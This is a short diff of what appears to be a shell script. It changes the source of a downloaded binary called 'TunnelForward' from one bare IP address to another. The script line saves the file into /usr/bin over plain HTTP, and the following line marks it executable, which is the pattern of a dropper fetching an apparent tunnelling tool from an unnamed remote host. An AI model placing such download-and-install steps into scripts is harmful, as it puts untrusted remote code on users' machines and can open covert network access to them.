@@ -1,4 +1,4 @@
-wget -O /usr/bin/TunnelForward http://103.136.187.104/TunnelForward
+wget -O /usr/bin/TunnelForward http://218.189.130.233/TunnelForward
 chmod +x /usr/bin/TunnelForward
 
 
